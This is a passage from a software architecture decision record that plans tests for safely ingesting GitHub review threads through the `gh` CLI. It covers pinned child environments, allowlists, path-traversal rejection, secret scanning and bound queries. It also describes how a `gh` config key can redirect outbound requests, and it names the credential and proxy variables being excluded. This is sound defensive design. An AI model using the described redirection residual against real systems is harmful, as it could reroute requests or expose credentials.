- The published `review.*` tool table has **7** rows, one shipped and six
  planned, which is why serving needs no new name:

  ```console
  $ grep -n '^| `review\.' docs/protocol/mcp-tools.md
  352:| `review.findings` | Shipped | Landed `Review-Finding:` trailers, filtered by reviewer, severity, commit or text |
  353:| `review.search` | Planned | Search review history |
  354:| `review.getThread` | Planned | One thread with comments and resolution |
  355:| `review.findSimilar` | Planned | Threads resembling a described situation |
  356:| `review.getDecisions` | Planned | Decisions reached in review |
  357:| `review.generateKnowledgeCandidate` | Planned write-intent | Emit a proposal; no approved-state write |
  358:| `review.listUnresolved` | Planned | Open threads |
  ```

- `ReviewResolution` has **no consumer outside its defining module**: two hits,
  both in `domain/review.py` (`git grep -n "ReviewResolution" --
  packages/theurian-core/src`).
- The core's runtime dependency list is **6** packages, none an HTTP client
  (`packages/theurian-core/pyproject.toml`).
- Three populations slice 1 must move, each with its key in *Dispositions* and
  each a dispatch input to be re-measured then: the **fetch-absence prose**
  (**30** files, wide phrase key), the **`providers.review.repositories`** key
  (**15** files), and the **Milestone-7 attribution** (**10** lines across
  **7** files). The first two overlap in **12** files on this branch (**11** at
  `1fe3302b`), which is why the allowlist reader's commit is sequenced serially
  before the adapter's rather than fanned out — the split is justified by
  `test_config_key_call_sites.py`'s pinned absence, not by disjointness.
- **This ADR is a member of both prose populations it measures**, which is why
  every one of those counts is stated against a named commit rather than as a
  property of the repository.
- The no-code scope of this change: `git diff origin/main...HEAD --stat` shows
  only paths under `docs/`, and
  `git diff origin/main...HEAD -- '*.py' '*.schema.json'` is empty.

Quoted, not re-run here — **design consult**, 2026-09-05, `gh` 2.86.0: runs A, B
and C; the `PullRequestReviewThread` field list; the observation that
`http_unix_socket` is a configuration key on that version while `api_host` is not;
and the 0/0 thread count over the last-40-merged window. **Round one's adversarial
review**, same date and binary: runs D, E and F, and the by-PR-number thread
population (11 threads across #12, #132, #224, #352, #569, plus 5 top-level
reviews) — run D and the thread population were re-run by the orchestrator and
reproduced. Slice 1 re-runs **D–F** as driving tests — that is where they become controls
instead of quotations. **A–C cannot be re-run in a test**: each one needs a real
outbound request to `api.github.com` or a hostile host, which no suite here makes.
They stay quoted, and they are re-taken **by hand** when clause 8's version floor
moves, since what they measure is a property of the binary.

Owed at implementation, each tied to the slice that discharges it:

**Slice 1 — ingest**

- **Ten clause tests**, one per row of decision 1's table: the single spawn site
  (equality-pinned), the literal `graphql` endpoint with identity in variables,
  the `--hostname github.com` pin, the absolute binary path with `shell=False`,
  the absence of `--paginate`, the timeout and the two caps as named constants,
  the version floor's refusal, the two graded refusal envelopes for absent and
  unauthenticated `gh` with no stderr escaping them, and the per-response byte cap
  with its incremental read.
- **Clause 4 gets two tests, not one, because one of them passes vacuously.**
  (i) the child's environment **equals** the enumerated constant — so the absence
  of `GH_HOST`, `GH_REPO`, the `GH_TOKEN` family and the proxy family is a
  consequence of equality rather than a list of remembered names; (ii) a
  **run-D-shaped positive control** — an isolated config directory carrying
  `http_unix_socket`, reached through a forwarded config-locating variable, moves
  the request — which keeps the recorded residual demonstrated instead of asserted
  and proves (i) can fail.
- **The allowlist is consulted before the spawn** — a synthetic-input test that a
  repository outside `providers.review.repositories` produces **no process
  spawn**, not a filtered result.
- **A private repository is refused at ingestion** — a synthetic-input test that
  nothing is written and the refusal carries a remedy.
- **A renamed repository is refused** — a fixture whose response resolves to a
  `nameWithOwner` other than the allowlisted entry is rejected, not followed.
- **Evidence paths are containment-safe before the key is load-bearing** — the
  schema pattern rejects `.` and `..` segments, and a path built from a hostile
  `owner/repo` value resolves through `security/paths.py` and is refused; both in
  the allowlist-reader commit.
- **`test_network_call_sites.py`'s absence claim is retired in the same commit
  that admits the site**, with the pinned set growing by exactly one and the file's
  own admission checklist satisfied clause by clause.
- **A pre-spawn refusal of transport-override keys** in the gh config the
  forwarded variables resolve to — best effort, with the TOCTOU race recorded as
  the surviving residual, and clause 4's test (ii) as its driving test.
- **Every T-7 sentence is rewritten per control** — `threat-model.md:6454`,
  `requirements-analysis.md:1352` and `roadmap.md:272`, which carries the same
  allowlist-owner sentence outside the two entries — recording the repository
  allowlist as **discharged** on the `gh` path and private-network rejection as
  **reduced with a named residual** (the TOCTOU race), never as discharged, with
  #429 still owning the raw-URL context.
- **The three populations move in this PR**: the fetch-absence prose, the
  `providers.review.repositories` sentences, and the Milestone-7 attributions.
- **The sites recording the old `reviewIngestion` meaning are rewritten** — the
  key, its exclusions and its output are in decision 2 — two slices before the
  flag flips. Four of them are test changes and one is a byte-pinned constant, so
  the sweep is not a prose pass.
- **The domain-model break is recorded** — a CHANGELOG entry under `#### Changed`
  with a `BREAKING` marker naming the old shape and the new one, and a
  `BREAKING CHANGE:` trailer on the commit.

**Slice 2 — land**

- **A flagged record under `block` never becomes a file** — a test with a
  synthetic secret-bearing comment asserting that no file is written, that the
  report names the record and not the matched bytes, and that the run does not
  read as clean.
- **`warn` lands and reports; `off` scans nothing** — one test each.
- **The scan reads exactly the author-controlled fields** of decision 3's table —
  a record whose secret sits in a label or a branch name is caught, not only one
  whose secret sits in a body.
- **Evidence files are the source** — a test that deleting the derived store and
  rebuilding from the files reproduces the served content, and that a record whose
  upstream has vanished survives a refetch.
- **FR-V5, made checkable** — a walk of the ingest path's modules asserting that
  none reaches an embedding, summarization or reranking provider, in the shape of
  `test_no_registered_tool_can_reach_a_canonical_write`
  (`tests/integration/test_mcp_tools.py:2357`): bytecode, not source, because a
  provider resolved through a factory is invisible to a name scan. Until it lands,
  decision 5's "no model exists anywhere in the ingest path" is design intent with
  a named owner, not a measured property.

**Slice 3 — serve**

- **Every author-controlled field carries the SEC-15 triple, bound by import** —
  a test that a `review.search` payload carries `theurian.mcp.results.SAFETY`
  (`mcp/results.py:44`) itself, not three re-spelled literals, with a companion
  asserting the check can fail. The population is decision 3's field table, so a
  field added there without a disposition reddens this test rather than shipping
  unclassified.
- **The two-corpora equality** — one query against an index that held synthetic
  withheld rows and one that never did, asserting identical responses across every
  published field, count and member.
- **A ranked surface over review evidence ranks the T-17a-purged population**, if
  one is built — a filter does not clean FTS5 collection statistics.
- **The capability flag and its scope field** — a test that
  `system.capabilities` publishes `reviewIngestion: true` together with the
  public-allowlisted scope, and that the wire schema accepts both. It reddens two
  existing equality pins on purpose —
  `test_mcp_tools.py`'s capability-key assertion and the flag-value assertion at
  `:1980` — so the slice cannot land the flag without moving what asserts it.
- **SEC-13 cross-project isolation over review evidence** — a test that a caller
  authorized for project A receives no review record belonging to project B. The
  requirement is not new, and neither is the control; what is new is a second
  store it has to hold over. Routed into this ADR by round two, which found it
  absent since the first draft.
- **`review.search` query input is bound, not interpolated** — a test that a
  query string reaches SQLite as a bound parameter and that FTS5 operator syntax
  in it is treated as text rather than as query structure. Same round-two routing:
  the ADR specified what the surface *returns* and never what it *accepts*.
